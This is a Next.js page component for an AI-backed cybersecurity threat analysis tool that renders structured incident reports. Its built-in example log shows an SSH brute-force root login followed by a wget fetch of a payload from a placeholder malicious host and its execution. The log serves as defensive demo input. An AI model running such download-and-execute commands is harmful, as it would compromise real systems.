'use client'

import { useState } from 'react'
import { AgentRunHistory } from '@/components/agents/agent-run-history'
import { AuthNav } from '@/components/auth/auth-nav'
import { AtlasLogo } from '@/components/brand/atlas-logo'
import { MAX_AGENT_INPUT_CHARS } from '@/lib/agents/constants'

type TimelineEntry = { timestamp: string; event: string }
type RemediationStep = { priority: 'Immediate' | 'Short-term' | 'Long-term'; action: string; description: string }

type ThreatReport = {
  executive_summary: string
  severity_level: 'Critical' | 'High' | 'Medium' | 'Low' | 'Informational'
  severity_rationale: string
  affected_systems: string[]
  attack_vector: string
  indicators_of_compromise: string[]
  timeline: TimelineEntry[]
  remediation_steps: RemediationStep[]
  error?: string
}

const SEVERITY_CONFIG = {
  Critical: { color: 'text-red-400', bg: 'bg-red-500/10', border: 'border-red-500/30', dot: 'bg-red-400' },
  High: { color: 'text-orange-400', bg: 'bg-orange-500/10', border: 'border-orange-500/30', dot: 'bg-orange-400' },
  Medium: { color: 'text-yellow-400', bg: 'bg-yellow-500/10', border: 'border-yellow-500/30', dot: 'bg-yellow-400' },
  Low: { color: 'text-blue-400', bg: 'bg-blue-500/10', border: 'border-blue-500/30', dot: 'bg-blue-400' },
  Informational: { color: 'text-white/50', bg: 'bg-white/5', border: 'border-white/10', dot: 'bg-white/40' },
}

const PRIORITY_CONFIG = {
  Immediate: { color: 'text-red-400', bg: 'bg-red-500/10', border: 'border-red-500/20' },
  'Short-term': { color: 'text-yellow-400', bg: 'bg-yellow-500/10', border: 'border-yellow-500/20' },
  'Long-term': { color: 'text-blue-400', bg: 'bg-blue-500/10', border: 'border-blue-500/20' },
}

const EXAMPLE_LOG = `Nov 15 03:47:12 webserver sshd[1842]: Failed password for root from 192.168.1.105 port 52341 ssh2
Nov 15 03:47:13 webserver sshd[1842]: Failed password for root from 192.168.1.105 port 52341 ssh2
Nov 15 03:47:14 webserver sshd[1842]: Failed password for root from 192.168.1.105 port 52341 ssh2
Nov 15 03:47:15 webserver sshd[1842]: Accepted password for root from 192.168.1.105 port 52341 ssh2
Nov 15 03:47:15 webserver sshd[1842]: pam_unix(sshd:session): session opened for user root by (uid=0)
Nov 15 03:48:02 webserver sudo: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://malicious.example.com/payload.sh
Nov 15 03:48:10 webserver bash: wget: /tmp/payload.sh downloaded successfully
Nov 15 03:48:12 webserver bash: chmod +x /tmp/payload.sh && /tmp/payload.sh`

export default function CybersecurityPage() {
  const [input, setInput] = useState('')
  const [loading, setLoading] = useState(false)
  const [report, setReport] = useState<ThreatReport | null>(null)
  const [error, setError] = useState<string | null>(null)
  const isInputTooLong = input.length > MAX_AGENT_INPUT_CHARS

  async function analyze() {
    if (!input.trim()) {
      setError('Please paste a security incident or log before running the agent.')
      return
    }

    if (isInputTooLong) {
      setError(`Input is too large. Please keep it under ${MAX_AGENT_INPUT_CHARS.toLocaleString()} characters.`)
      return
    }
    setLoading(true)
    setReport(null)
    setError(null)

    try {
      const res = await fetch('/agents/api/analyze-security', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ input }),
      })
      const data: ThreatReport = await res.json()

      if (!res.ok || data.error) {
        setError(data.error ?? 'Analysis failed. Please try again.')
      } else {
        setReport(data)
      }
    } catch {
      setError('Network error — could not reach the analysis service.')
    } finally {
      setLoading(false)
    }
  }

  const severity = report ? SEVERITY_CONFIG[report.severity_level] ?? SEVERITY_CONFIG.Informational : null

  return (
    <div className="page-noise min-h-screen bg-[#0a0a0f] font-[family-name:var(--font-geist-sans)]">
      {/* Header */}
      <header className="border-b border-white/10 px-8 py-5 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <AtlasLogo href="/agents" />
          <span className="text-white/20 mx-1">/</span>
          <span className="text-white/50 text-sm">Cybersecurity Threat Agent</span>
        </div>
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-2 bg-green-500/10 border border-green-500/20 rounded-full px-3 py-1.5">
            <span className="w-1.5 h-1.5 bg-green-400 rounded-full animate-pulse"></span>
            <span className="text-green-400 text-xs font-medium">Live</span>
          </div>
          <AuthNav />
        </div>
      </header>

      <div className="max-w-5xl mx-auto px-8 py-12">
        {/* Hero */}
        <div className="mb-10">
          <div className="text-4xl mb-4">🛡️</div>
          <h1 className="text-3xl font-bold text-white mb-3">Cybersecurity Threat Agent</h1>
          <p className="text-white/50 text-lg max-w-2xl">
            Paste a security incident report, system log, or alert. The agent returns a full structured threat analysis with severity, attack vector, and remediation steps — powered by Claude.
          </p>
        </div>

        {/* Input panel */}
        <div className="border border-white/10 rounded-2xl bg-white/[0.02] p-6 mb-6">
          <div className="flex items-center justify-between mb-3">
            <label className="text-white/60 text-sm font-medium">Incident Report or System Log</label>
            <button
              onClick={() => setInput(EXAMPLE_LOG)}
              className="text-blue-400/70 text-xs hover:text-blue-400 transition-colors"
            >
              Load example
            </button>
          </div>
          <textarea
            value={input}
            onChange={(e) => setInput(e.target.value)}
            placeholder="Paste your security incident, system log, IDS alert, or threat report here..."
            rows={12}
            className="w-full bg-black/30 border border-white/10 rounded-xl px-4 py-3 text-white/80 placeholder-white/20 text-sm font-[family-name:var(--font-geist-mono)] resize-y focus:outline-none focus:border-blue-500/50 focus:bg-black/40 transition-all"
          />
          <div className="flex items-center justify-between mt-4">
            <span className={`text-xs ${isInputTooLong ? 'text-red-300' : 'text-white/20'}`}>
              {input.length} / {MAX_AGENT_INPUT_CHARS.toLocaleString()} characters
            </span>
            <button
              onClick={analyze}
              disabled={loading || !input.trim() || isInputTooLong}
              className="flex items-center gap-2 bg-blue-600 hover:bg-blue-500 disabled:opacity-40 disabled:cursor-not-allowed text-white text-sm font-medium px-6 py-2.5 rounded-xl transition-all"
            >
              {loading ? (
                <>
                  <span className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin"></span>
                  Analyzing...
                </>
              ) : (
                <>Analyze Threat →</>
              )}
            </button>
          </div>
        </div>

        {/* Error state */}
        {error && (
          <div className="border border-red-500/30 bg-red-500/5 rounded-2xl p-6 mb-6">
            <div className="flex items-start gap-3">
              <span className="text-red-400 text-lg">⚠</span>
              <div>
                <p className="text-red-400 font-medium mb-1">Analysis Error</p>
                <p className="text-white/50 text-sm">{error}</p>
              </div>
            </div>
          </div>
        )}

        {/* Report */}
        {report && severity && (
          <div className="space-y-4">
            {/* Severity banner */}
            <div className={`border ${severity.border} ${severity.bg} rounded-2xl p-6 flex items-start justify-between gap-6`}>
              <div className="flex-1">
                <div className="flex items-center gap-2 mb-2">
                  <span className={`w-2.5 h-2.5 rounded-full ${severity.dot}`}></span>
                  <span className={`text-xs font-semibold uppercase tracking-widest ${severity.color}`}>
                    {report.severity_level} Severity
                  </span>
                </div>
                <p className="text-white/80 text-sm leading-relaxed">{report.executive_summary}</p>
                <p className={`text-xs mt-2 ${severity.color} opacity-70`}>{report.severity_rationale}</p>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* Attack vector */}
              <div className="border border-white/10 bg-white/[0.02] rounded-2xl p-6">
                <h3 className="text-white/40 text-xs font-semibold uppercase tracking-widest mb-3">Attack Vector</h3>
                <p className="text-white/80 text-sm leading-relaxed">{report.attack_vector}</p>
              </div>

              {/* Affected systems */}
              <div className="border border-white/10 bg-white/[0.02] rounded-2xl p-6">
                <h3 className="text-white/40 text-xs font-semibold uppercase tracking-widest mb-3">Affected Systems</h3>
                <div className="flex flex-wrap gap-2">
                  {report.affected_systems.map((sys, i) => (
                    <span key={i} className="bg-white/5 border border-white/10 rounded-lg px-3 py-1 text-white/70 text-xs font-[family-name:var(--font-geist-mono)]">
                      {sys}
                    </span>
                  ))}
                </div>
              </div>
            </div>

            {/* Timeline */}
            {report.timeline.length > 0 && (
              <div className="border border-white/10 bg-white/[0.02] rounded-2xl p-6">
                <h3 className="text-white/40 text-xs font-semibold uppercase tracking-widest mb-4">Attack Timeline</h3>
                <div className="space-y-0">
                  {report.timeline.map((entry, i) => (
                    <div key={i} className="flex gap-4 relative">
                      <div className="flex flex-col items-center">
                        <div className="w-2 h-2 rounded-full bg-blue-500 mt-1 shrink-0 z-10"></div>
                        {i < report.timeline.length - 1 && (
                          <div className="w-px flex-1 bg-blue-500/20 my-1"></div>
                        )}
                      </div>
                      <div className="pb-4 flex-1 min-w-0">
                        <span className="text-blue-400/70 text-xs font-[family-name:var(--font-geist-mono)] block mb-0.5">{entry.timestamp}</span>
                        <p className="text-white/70 text-sm">{entry.event}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* IOCs */}
            {report.indicators_of_compromise.length > 0 && (
              <div className="border border-white/10 bg-white/[0.02] rounded-2xl p-6">
                <h3 className="text-white/40 text-xs font-semibold uppercase tracking-widest mb-3">Indicators of Compromise</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                  {report.indicators_of_compromise.map((ioc, i) => (
                    <div key={i} className="flex items-center gap-2 bg-black/20 border border-white/5 rounded-lg px-3 py-2">
                      <span className="w-1 h-1 rounded-full bg-orange-400 shrink-0"></span>
                      <span className="text-white/60 text-xs font-[family-name:var(--font-geist-mono)] break-all">{ioc}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Remediation */}
            <div className="border border-white/10 bg-white/[0.02] rounded-2xl p-6">
              <h3 className="text-white/40 text-xs font-semibold uppercase tracking-widest mb-4">Remediation Steps</h3>
              <div className="space-y-3">
                {report.remediation_steps.map((step, i) => {
                  const pConfig = PRIORITY_CONFIG[step.priority] ?? PRIORITY_CONFIG['Long-term']
                  return (
                    <div key={i} className="flex gap-4 border border-white/5 bg-black/20 rounded-xl p-4">
                      <div className="shrink-0 mt-0.5">
                        <span className={`inline-flex items-center ${pConfig.bg} border ${pConfig.border} rounded-full px-2.5 py-0.5 text-xs font-medium ${pConfig.color}`}>
                          {step.priority}
                        </span>
                      </div>
                      <div className="min-w-0">
                        <p className="text-white/80 text-sm font-medium mb-1">{step.action}</p>
                        <p className="text-white/40 text-sm leading-relaxed">{step.description}</p>
                      </div>
                    </div>
                  )
                })}
              </div>
            </div>

            <p className="text-white/20 text-xs text-center pb-4">
              Analysis generated by Atlas Synapse Cybersecurity Agent
            </p>
          </div>
        )}
        <AgentRunHistory agentName="Cybersecurity Threat Agent" />
      </div>
    </div>
  )
}
